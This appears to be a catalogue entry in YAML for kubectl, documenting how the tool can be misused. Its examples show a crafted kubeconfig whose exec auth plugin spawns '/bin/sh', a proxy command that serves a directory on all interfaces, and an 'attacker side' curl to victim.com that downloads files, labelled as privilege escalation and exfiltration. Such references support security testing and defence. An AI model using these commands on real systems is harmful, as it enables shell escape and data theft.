---
id: orchestration-kubernetes-kubectl
namespace: orchestration:kubernetes:kubectl
name: kubectl
description: Kubernetes command-line tool that can spawn shells via exec auth config and serve files via proxy.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
  - network.transfer.upload
  - orchestration.kubernetes.manage
platforms:
  - linux
  - macos
  - windows
  - cross-platform
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - helm
  - k9s
artifacts: []
workflow_edges:
  produces:
    - shell-access
    - file-transfer
  consumes:
    - kubeconfig
contract:
  inputs:
    - type: orchestration.kubeconfig
      description: Path to kubeconfig
  outputs:
    - type: process.output
      description: Shell output
  side_effects:
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 32
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 32
  network: medium
  disk_io: low
allowed-tools:
  - kubectl
  - Bash
  - execFile
parameters:
  - name: kubeconfig
    type: file
    required: false
    description: "Path to kubeconfig file"
    aliases:
      - --kubeconfig
  - name: proxy
    type: string
    required: false
    description: "Run proxy"
    aliases:
      - proxy
  - name: address
    type: string
    required: false
    description: "Proxy listen address"
    aliases:
      - --address
  - name: port
    type: integer
    required: false
    description: "Proxy listen port"
    aliases:
      - --port
  - name: www
    type: string
    required: false
    description: "Directory to serve"
    aliases:
      - --www
  - name: www-prefix
    type: string
    required: false
    description: "URL prefix for served files"
    aliases:
      - --www-prefix
features:
  - process-manip
  - network-intensive
execution:
  template: "kubectl {kubeconfig} {proxy} {address} {port} {www} {www-prefix}"
  sandbox: execFile
  timeout_seconds: 60
  shell: false
global_vars: {}
examples:
  - description: Spawn shell via crafted kubeconfig with exec auth plugin
    command: |-
      cat >/path/to/temp-file <<EOF
      clusters:
      - cluster:
          server: https://x
        name: x
      contexts:
      - context:
          cluster: x
          user: x
        name: x
      current-context: x
      users:
      - name: x
        user:
          exec:
            apiVersion: client.authentication.k8s.io/v1
            interactiveMode: Always
            command: /bin/sh
            args:
              - '-c'
              - '/bin/sh 0<&2 1>&2'
      EOF
      kubectl get pods --kubeconfig=/path/to/temp-file
  - description: Serve directory via HTTP for file upload
    command: kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/
  - description: Download files from kubectl HTTP server (attacker side)
    command: curl victim.com:12345/x/path/to/input-file -o /path/to/output-file
references:
  - label: "kubectl documentation"
    url: "https://kubernetes.io/docs/reference/kubectl/"
techniques:
  - privilege-escalation
  - execution
  - exfiltration
install:
    - method: apt
      package_name: "kubectl"
      commands:
        - "apt-get install -y kubectl"
---


# kubectl — Kubernetes CLI

kubectl manages Kubernetes clusters. It can spawn a privileged shell via a crafted kubeconfig file with an exec-based authentication plugin, and serve files via the proxy subcommand for data exfiltration.
